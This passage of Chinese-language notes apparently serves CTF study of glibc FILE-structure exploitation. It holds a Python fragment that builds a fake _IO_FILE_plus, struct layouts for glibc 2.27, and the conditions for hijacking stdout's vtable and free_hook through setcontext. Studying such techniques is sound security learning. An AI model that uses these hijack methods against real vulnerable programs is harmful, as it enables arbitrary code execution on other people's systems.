    # 要劫持vatble为多少
    "vatble":_IO_wfile_jumps,
}

fake_IO = IO_FILE_plus_struct()
fake_IO._IO_buf_end = magic_addrs.get("rbp_value")
fake_IO._IO_save_base = magic_addrs.get("rbp")
fake_IO._IO_backup_base = magic_addrs.get("rdi")
fake_IO._IO_save_end = magic_addrs.get("rax")
fake_IO._mode = fsop_exit_addrs.get("_mode")
fake_IO._lock = fsop_exit_addrs.get("_lock")
fake_IO.chain = wfile_addrs.get("first_cmd")
fake_IO.fileno = 0
fake_IO._old_offset = 0
fake_IO._offset = 0
fake_IO._wide_data = wfile_addrs.get("_wide_data")
fake_IO.unknown2 = magic_addrs.get("call")
fake_IO._codecvt= wfile_addrs.get("_wide_vtable")
fake_IO.vtable = fsop_exit_addrs.get("vatble")
```

#### 劫持puts` _IO_2_1_stdout`_

- puts函数

```c
int
_IO_puts (const char *str)
{
  int result = EOF;
  _IO_size_t len = strlen (str);
  _IO_acquire_lock (_IO_stdout);

  if ((_IO_vtable_offset (_IO_stdout) != 0
       || _IO_fwide (_IO_stdout, -1) == -1)
      && _IO_sputn (_IO_stdout, str, len) == len
      && _IO_putc_unlocked ('\n', _IO_stdout) != EOF)
    result = MIN (INT_MAX, len + 1);

  _IO_release_lock (_IO_stdout);
  return result;
}
```

- 也就是保证lock指向的位置值为1
- _mode应该为0
- vtable应该为_IO_wfile_jumps-32,方便调用`_IO_wfile_overflow`

## 2.27

### _IO_FILE_plus结构体

- _IO_FILE_plus

```c
/* offset    |  size */  type = struct _IO_FILE_plus {
/*    0      |   216 */    _IO_FILE file;
/*  216      |     8 */    const struct _IO_jump_t *vtable;

                           /* total size (bytes):  224 */
                         }

```

- _IO_FILE

```c
/* offset    |  size */  type = struct _IO_FILE {
/*    0      |     4 */    int _flags;
/* XXX  4-byte hole  */
/*    8      |     8 */    char *_IO_read_ptr;
/*   16      |     8 */    char *_IO_read_end;
/*   24      |     8 */    char *_IO_read_base;
/*   32      |     8 */    char *_IO_write_base;
/*   40      |     8 */    char *_IO_write_ptr;
/*   48      |     8 */    char *_IO_write_end;
/*   56      |     8 */    char *_IO_buf_base;
/*   64      |     8 */    char *_IO_buf_end;
/*   72      |     8 */    char *_IO_save_base;
/*   80      |     8 */    char *_IO_backup_base;
/*   88      |     8 */    char *_IO_save_end;
/*   96      |     8 */    struct _IO_marker *_markers;
/*  104      |     8 */    struct _IO_FILE *_chain;
/*  112      |     4 */    int _fileno;
/*  116      |     4 */    int _flags2;
/*  120      |     8 */    __off_t _old_offset;
/*  128      |     2 */    unsigned short _cur_column;
/*  130      |     1 */    signed char _vtable_offset;
/*  131      |     1 */    char _shortbuf[1];
/* XXX  4-byte hole  */
/*  136      |     8 */    _IO_lock_t *_lock;
/*  144      |     8 */    __off64_t _offset;
/*  152      |     8 */    struct _IO_codecvt *_codecvt;
/*  160      |     8 */    struct _IO_wide_data *_wide_data;
/*  168      |     8 */    struct _IO_FILE *_freeres_list;
/*  176      |     8 */    void *_freeres_buf;
/*  184      |     8 */    size_t __pad5;
/*  192      |     4 */    int _mode;
/*  196      |    20 */    char _unused2[20];

                           /* total size (bytes):  216 */
                         }

```

### _IO_wide_data结构体

```c
/* offset    |  size */  type = struct _IO_wide_data {
/*    0      |     8 */    wchar_t *_IO_read_ptr;
/*    8      |     8 */    wchar_t *_IO_read_end;
/*   16      |     8 */    wchar_t *_IO_read_base;
/*   24      |     8 */    wchar_t *_IO_write_base;
/*   32      |     8 */    wchar_t *_IO_write_ptr;
/*   40      |     8 */    wchar_t *_IO_write_end;
/*   48      |     8 */    wchar_t *_IO_buf_base;
/*   56      |     8 */    wchar_t *_IO_buf_end;
/*   64      |     8 */    wchar_t *_IO_save_base;
/*   72      |     8 */    wchar_t *_IO_backup_base;
/*   80      |     8 */    wchar_t *_IO_save_end;
/*   88      |     8 */    __mbstate_t _IO_state;
/*   96      |     8 */    __mbstate_t _IO_last_state;
/*  104      |   192 */    struct _IO_codecvt {
/*  104      |     8 */        void (*__codecvt_destr)(struct _IO_codecvt *);
/*  112      |     8 */        enum __codecvt_result (*__codecvt_do_out)(struct _IO_codecvt *, __mbstate_t *, const wchar_t *, const wchar_t *, const wchar_t **, char *, char *, char **);
/*  120      |     8 */        enum __codecvt_result (*__codecvt_do_unshift)(struct _IO_codecvt *, __mbstate_t *, char *, char *, char **);
/*  128      |     8 */        enum __codecvt_result (*__codecvt_do_in)(struct _IO_codecvt *, __mbstate_t *, const char *, const char *, const char **, wchar_t *, wchar_t *, wchar_t **);
/*  136      |     8 */        int (*__codecvt_do_encoding)(struct _IO_codecvt *);
/*  144      |     8 */        int (*__codecvt_do_always_noconv)(struct _IO_codecvt *);
/*  152      |     8 */        int (*__codecvt_do_length)(struct _IO_codecvt *, __mbstate_t *, const char *, const char *, size_t);
/*  160      |     8 */        int (*__codecvt_do_max_length)(struct _IO_codecvt *);
/*  168      |    64 */        _G_iconv_t __cd_in;
/*  232      |    64 */        _G_iconv_t __cd_out;

                               /* total size (bytes):  192 */
                           } _codecvt;
/*  296      |     4 */    wchar_t _shortbuf[1];
/* XXX  4-byte hole  */
/*  304      |     8 */    const struct _IO_jump_t *_wide_vtable;

                           /* total size (bytes):  312 */
                         }

```

### 虚表

```c
/* offset    |  size */  type = struct _IO_jump_t {
/*    0      |     8 */    size_t __dummy;
/*    8      |     8 */    size_t __dummy2;
/*   16      |     8 */    _IO_finish_t __finish;
/*   24      |     8 */    _IO_overflow_t __overflow;
/*   32      |     8 */    _IO_underflow_t __underflow;
/*   40      |     8 */    _IO_underflow_t __uflow;
/*   48      |     8 */    _IO_pbackfail_t __pbackfail;
/*   56      |     8 */    _IO_xsputn_t __xsputn;
/*   64      |     8 */    _IO_xsgetn_t __xsgetn;
/*   72      |     8 */    _IO_seekoff_t __seekoff;
/*   80      |     8 */    _IO_seekpos_t __seekpos;
/*   88      |     8 */    _IO_setbuf_t __setbuf;
/*   96      |     8 */    _IO_sync_t __sync;
/*  104      |     8 */    _IO_doallocate_t __doallocate;
/*  112      |     8 */    _IO_read_t __read;
/*  120      |     8 */    _IO_write_t __write;
/*  128      |     8 */    _IO_seek_t __seek;
/*  136      |     8 */    _IO_close_t __close;
/*  144      |     8 */    _IO_stat_t __stat;
/*  152      |     8 */    _IO_showmanyc_t __showmanyc;
/*  160      |     8 */    _IO_imbue_t __imbue;

                           /* total size (bytes):  168 */
                         }

```

### 虚表实现

> 2.27的实现都是分散的不是集中在一起的就参考_IO_jump_t吧

### 劫持puts _IO_2_stdout_

> 因为2.27具备hook 所以其实打io并不是一个很好的选择

```c
int
_IO_puts (const char *str)
{
  int result = EOF;
  _IO_size_t len = strlen (str);
  _IO_acquire_lock (_IO_stdout);

  if ((_IO_vtable_offset (_IO_stdout) != 0
       || _IO_fwide (_IO_stdout, -1) == -1)
      && _IO_sputn (_IO_stdout, str, len) == len
      && _IO_putc_unlocked ('\n', _IO_stdout) != EOF)
    result = MIN (INT_MAX, len + 1);

  _IO_release_lock (_IO_stdout);
  return result;
}
```

- 也就是保证lock指向的位置值为1
- _mode应该为0
- vtable应该为_IO_wfile_jumps-32,方便调用`_IO_wfile_overflow`

## free_hook

直接打free_hook就行 rdi就是我们的free的参数 这样我们就可以利用setcontext进行控制



